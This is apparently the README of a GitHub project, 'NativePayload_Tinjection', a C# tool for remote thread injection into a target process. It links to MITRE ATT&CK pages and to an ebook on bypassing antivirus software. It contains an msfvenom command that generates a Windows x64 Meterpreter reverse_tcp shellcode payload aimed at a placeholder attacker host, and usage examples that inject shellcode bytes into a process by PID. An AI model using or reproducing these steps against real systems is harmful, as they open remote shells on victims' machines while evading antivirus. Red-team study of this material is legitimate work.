# NativePayload_Tinjection
Creating Remote Thread into Target Process , (Remote Thread Injection by C#)

-----------------------
Related Links for "Mitre ATT&CK" : 

Process Injection: Portable Executable Injection ==>  https://attack.mitre.org/techniques/T1055/002/

Process Injection: Dynamic-link Library Injection ==> https://attack.mitre.org/techniques/T1055/001/

--------------------------
Your Payload Should be Msfvenom Payload ... 

Msfvenom –platform windows –arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=w.x.y.z -f c > payload.txt
-------------------------

    Code1: NativePayload_Tinjection.exe [TPID] [PAYLOAD]

    Code2: NativePayload_Tinjectionx.exe [TPID] [PAYLOAD]


    EXAMPLE: NativePayload_Tinjection.exe 2452 "FC,48,83,00,..."

    EXAMPLE: NativePayload_Tinjectionx.exe 2452 "FC,48,83,00,..."
    
------------------------------------------------

Article [1]: https://www.linkedin.com/pulse/bypassing-anti-virus-creating-remote-thread-target-mohammadbagher

step by step => Chapter 14 : C# Delegate & Remote Thread Injection Technique (Part1)

https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH14/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2014%20-Part1.pdf

------------------------------------------------

online eBook, (chapters): https://damonmohammadbagher.github.io/Posts/ebookBypassingAVsByCsharpProgramming/

------------------------------------------------


![](https://github.com/DamonMohammadbagher/NativePayload_Tinjection/blob/main/Picture/2.jpeg)
